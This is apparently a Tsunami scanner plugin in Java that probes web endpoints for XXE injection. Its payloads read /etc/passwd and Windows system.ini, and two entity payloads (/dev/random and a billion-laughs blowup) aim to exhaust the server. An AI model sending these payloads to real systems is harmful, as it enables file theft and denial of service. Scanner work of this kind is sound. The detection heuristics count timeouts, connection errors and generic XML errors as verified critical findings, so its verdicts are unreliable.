/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.ExecutionException;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "XxeinjectiondetectorpluginDetector",
    version = "0.1",
    description = "Detects XxeInjectionDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = XxeinjectiondetectorpluginDetectorBootstrapModule.class)
public final class XxeinjectiondetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public XxeinjectiondetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Xxeinjectiondetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "application/xml,text/html,application/xhtml+xml,application/json,*/*")
            .addHeader("Content-Type", "application/xml")
            .build();
        
        // Test 1: Linux file inclusion attack (/etc/passwd)
        String linuxPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>";
        if (testXxeFileInclusion(targetUri, linuxPayload, headers, networkService, "root:")) {
            successfulAttacks++;
        }
        
        // Test 2: Windows file inclusion attack (system.ini)
        String windowsPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///C:/Windows/system.ini\">]><root>&xxe;</root>";
        if (testXxeFileInclusion(targetUri, windowsPayload, headers, networkService, "[drivers]")) {
            successfulAttacks++;
        }
        
        // Test 3: DoS attack with /dev/random (Linux)
        String dosPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///dev/random\">]><root>&xxe;</root>";
        if (testXxeDoS(targetUri, dosPayload, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 4: Quadratic blowup attack (billion laughs variant)
        String blowupPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY a \"aaaaaaaaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\"><!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\">]><root>&d;</root>";
        if (testXxeDoS(targetUri, blowupPayload, headers, networkService)) {
            successfulAttacks++;
        }
        
        return successfulAttacks > 0;
        
    } catch (Exception e) {
        logger.atWarning().log(
            format("XXE injection test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

private boolean testXxeFileInclusion(String targetUri, String payload, HttpHeaders headers, NetworkService networkService, String expectedContent) {
    String[] endpoints = {"/file-upload", "/complaint", "/api/complaint", "/upload", "/api/file-upload"};
    
    for (String endpoint : endpoints) {
        try {
            HttpResponse response = httpClient.send(
                HttpRequest.post(targetUri + endpoint)
                    .setHeaders(headers)
                    .setRequestBody(ByteString.copyFromUtf8(payload))
                    .build(),
                networkService);
            
            String responseBody = response.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            
            // Check if file content is leaked in response body or error messages
            if (responseBody.toLowerCase().contains(expectedContent.toLowerCase()) ||
                responseBody.contains("Permission denied") ||
                responseBody.contains("No such file") ||
                responseBody.contains("Access is denied") ||
                responseBody.contains("file:///")) {
                return true;
            }
            
            // Check for XML parsing errors that might indicate XXE processing
            if (response.status().code() >= 400 && 
                (responseBody.contains("XML") || responseBody.contains("entity") || 
                 responseBody.contains("DOCTYPE") || responseBody.contains("External"))) {
                return true;
            }
            
        } catch (IOException e) {
            // Network errors might indicate successful XXE processing
            if (e.getMessage().contains("timeout") || e.getMessage().contains("connection")) {
                return true;
            }
        }
    }
    return false;
}

private boolean testXxeDoS(String targetUri, String payload, HttpHeaders headers, NetworkService networkService) {
    String[] endpoints = {"/file-upload", "/complaint", "/api/complaint", "/upload", "/api/file-upload"};
    
    for (String endpoint : endpoints) {
        try {
            long startTime = System.currentTimeMillis();
            
            CompletableFuture<HttpResponse> future = CompletableFuture.supplyAsync(() -> {
                try {
                    return httpClient.send(
                        HttpRequest.post(targetUri + endpoint)
                            .setHeaders(headers)
                            .setRequestBody(ByteString.copyFromUtf8(payload))
                            .build(),
                        networkService);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            });
            
            try {
                HttpResponse response = future.get(3, TimeUnit.SECONDS);
                long responseTime = System.currentTimeMillis() - startTime;
                
                // If response takes longer than 1 second, likely processing XXE
                if (responseTime > 1000) {
                    return true;
                }
                
                // Check for server errors indicating resource exhaustion
                if (response.status().code() >= 500) {
                    String responseBody = response.bodyBytes()
                        .map(bs -> bs.toStringUtf8())
                        .orElse("");
                    if (responseBody.contains("timeout") || responseBody.contains("memory") ||
                        responseBody.contains("resource") || responseBody.contains("limit")) {
                        return true;
                    }
                }
                
            } catch (TimeoutException e) {
                // Timeout indicates successful DoS via XXE
                future.cancel(true);
                return true;
            } catch (ExecutionException e) {
                // Execution errors might indicate resource exhaustion
                if (e.getCause() instanceof IOException) {
                    String errorMsg = e.getCause().getMessage();
                    if (errorMsg.contains("timeout") || errorMsg.contains("connection")) {
                        return true;
                    }
                }
            }
            
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return false;
        }
    }
    return false;
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("XXEINJECTIONDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("XxeInjectionDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to XxeInjectionDetectorPlugin attacks.")
                .setRecommendation(
                    "Disable external entity processing in XML parsers, use secure XML parsing libraries, and implement proper input validation for XML content"))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("XXEINJECTIONDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("XxeInjectionDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to XxeInjectionDetectorPlugin attacks.")
            .setRecommendation(
                "Disable external entity processing in XML parsers, use secure XML parsing libraries, and implement proper input validation for XML content")
        .build());
  }
}